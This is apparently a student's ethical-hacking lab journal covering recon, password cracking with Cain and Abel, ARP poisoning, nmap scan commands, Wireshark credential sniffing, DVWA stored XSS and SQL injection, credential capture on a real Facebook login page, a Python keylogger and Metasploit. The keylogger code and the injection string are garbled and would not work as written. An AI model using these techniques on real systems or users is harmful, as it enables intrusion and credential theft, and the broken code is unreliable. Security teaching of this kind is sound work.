@@ -1,0 +1,188 @@
+ETHICAL HACKING
+PRACTICAL NO. 1
+TCS2223013
+CHIRAG BHATIA
+Aim:
+Use Google and Whois for Reconnaissance
+ETHICAL HACKING
+PRACTICAL NO. 2
+TCS2223013
+CHIRAG BHATIA
+Aim:
+2.1
+Use Crypt Tool to encrypt and decrypt passwords using RC4 
+algorithm. 
+1. Install CrypTool from https://www.cryptool.org/en/ct1-
+downloads. 
+2. Plain Text
+3. To Encrypt Click on Encrypt/Decrypt > 
+Symmetric(modern) > RC4 
+4. Click the number of bits
+5. Click Encrypt
+6. To Decrypt Again click on Encrypt/Decrypt > 
+Symmetric(modern) > RC4 
+7. Click the number of bits.
+8. Click Decrypt.
+2.2:Use Cain and Abel for cracking Windows account password 
+using Dictionary attack and to decode wireless network 
+passwords.
+1. Open the software, click on Cracker tab >> Hash 
+Calculator tool as shown in the image.
+2. A dialogue box appears after clicking on hash 
+calculator, Add the text >> Calculate hash code >> 
+Copy MD5 hash value.
+3. Click on MD5 Hashes>> Add list>>Paste Hash Value.
+4.
+Click on hash code right click, Dictionary Attack>>Add 
+to list>>Start
+
+ETHICAL HACKING
+PRACTICAL NO. 3
+TCS2223013
+CHIRAG BHATIA
+Aim:
+3.1
+Using Traceroute, ping, ipconfig, netstat Command. 
+3.2
+Perform ARP Poisoning in Windows.
+1. Click on Sniffer tab.
+2. Click on Start/Stop Sniffer and give range values and 
+click okay.
+3. Right click on any IP and select Resolve Host Name.
+4. Click on ARP tab on the bottom.
+5. Click on Add Button (1) and select your router and any 
+IP.
+6. Click on the IP and then click on the button shown in 
+the image to start ARP Poisoning.
+ETHICAL HACKING
+PRACTICAL NO. 4
+TCS2223013
+CHIRAG BHATIA
+Aim:
+Using Nmap scanner to perform port scanning of various 
+forms – ACK, SYN, FIN, NULL, XMAS
+Install Nmap for windows and install it. After that open cmd 
+and type “nmap” to check if it is installed properly. Now type 
+the below commands.
+• ACK -sA (TCP ACK scan) 
+It never determines open (or even open filtered) ports. It is 
+used to map out firewall rulesets, determining whether they 
+are stateful or not and which ports are filtered.
+##Command: nmap -sA -T4 scanme.nmap.org##
+• SYN (Stealth) Scan (-sS) 
+SYN scan is the default and most popular scan option for 
+good reason. It can be performed quickly, scanning thousands 
+of ports per second on a fast network not hampered by 
+intrusive firewalls. 
+##Command: nmap -p22,113,139 scanme.nmap.org##
+• FIN Scan (-sF) 
+Sets just the TCP FIN bit. 
+##Command: nmap -sF -T4 para##
+• NULL Scan (-sN) 
+Does not set any bits (TCP flag header is 0) 
+##Command: nmap –sN –p 22 scanme.nmap.org##
+• XMAS Scan (-sX) 
+Sets the FIN, PSH, and URG flags, lighting the packet up like a 
+Christmas tree. 
+##Command: nmap -sX -T4 scanme.nmap.org##
+ETHICAL HACKING
+PRACTICAL NO. 5
+TCS2223013
+CHIRAG BHATIA
+Aim:
+Use Wireshark sniffer to capture network traffic and analyse.
+1. Open Wireshark and select your Connection.
+2. Open any http website and add display filter as http.
+3. Right Click on the POST method >> Follow >> TCP 
+stream.
+4. Search for ‘credentials’ in the dialog box.
+ETHICAL HACKING
+PRACTICAL NO. 6
+TCS2223013
+CHIRAG BHATIA
+Aim:
+Simulate persistent Cross Site Scripting attack.
+1. Extract the DVWA zip file. 
+2. Copy the folder and paste it in Drive C: > xampp > htdocs 
+3. Rename the file as DVWA. 
+4. Go in the config file and rename the file as 
+config.inc.php 
+5. Open chrome and search localhost/DVWA. 
+6. Click on create/reset database. The database will be 
+created. Click on login.
+7. Username = “Admin” and Password = “password”. Click 
+on login.
+8. Click on DVWA security and set the security to low.
+9. Click on XSS (Stored) write the script and click on sign 
+guestbook. The script will be executed whenever the 
+page is reloaded.
+
+ETHICAL HACKING
+PRACTICAL NO. 7
+TCS2223013
+CHIRAG BHATIA
+Aim:
+Session impersonation using Firefox and Tamper Data add on
+1. Open Firefox 
+2. Go to tools > Add on > Extension 
+3. Search and install Temper Data. 
+4. Go to Facebook login page. 
+5. Now click on tamper add on and start tampering the 
+data. 
+6. Now enter the username and password in the Facebook
+login page. 
+7. Your username and password are being captured using 
+session impersonation.
+8. Select a website for tempering data e.g(razorba).
+9. Select any item to buy 
+10. Then click on add-cart 
+11. Then click on TemperData(add-on)
+12. Refresh the page to get the extension.
+13. Click on OK.
+14. Change values in Cookie option for tempering the DATA.
+15. Then click on OK and see the Data has been Tempered.
+ETHICAL HACKING
+PRACTICAL NO. 8
+TCS2223013
+CHIRAG BHATIA
+Aim:
+Perform SQL injection attack.
+1. Extract the DVWA zip file. 
+2. Copy the folder and paste it in Drive C: > xampp > htdocs 
+3. Rename the file as DVWA. 
+4. Go in the config file and rename the file as 
+config.inc.php 
+5. Open chrome and search localhost/DVWA. 
+6. Click on create/reset database. The database will be 
+created. Click on login.
+7. Username = “Admin” and Password = “password”. 
+Click on login.
+8. Click on DVWA security and set the security to low.
+9. Click on SQL Injection. 
+10. In User Id enter 1 and click on submit.
+10. Type 1’ or tue;# and click on submit.
+ETHICAL HACKING
+PRACTICAL NO. 9
+TCS2223013
+CHIRAG BHATIA
+Aim:
+Create a simple keylogger using Python.
+from pynput.keyboard import Key, Listener
+import logging
+# if no name it gets into an empty string log_dir = "" 
+# This is a basic logging function 
+logging.basicConfig(filename=(log_dir + "key_log.txt"), 
+level=logging.DEBUG, format='%(asctime)s:%(message)s:')
+# This is from the library def on_press(key): 
+logging.info(str(key))
+# This says, listener is on with Listener(on_press=on_press) 
+as listener: listener.join()
+ETHICAL HACKING
+PRACTICAL NO. 10
+TCS2223013
+CHIRAG BHATIA
+Aim:
+Using Metasploit to exploit (Kali Linux)
+Download and open Metasploit.
+Use exploit to attack the host.
+Create the exploit and add the exploit to the victim’s PC
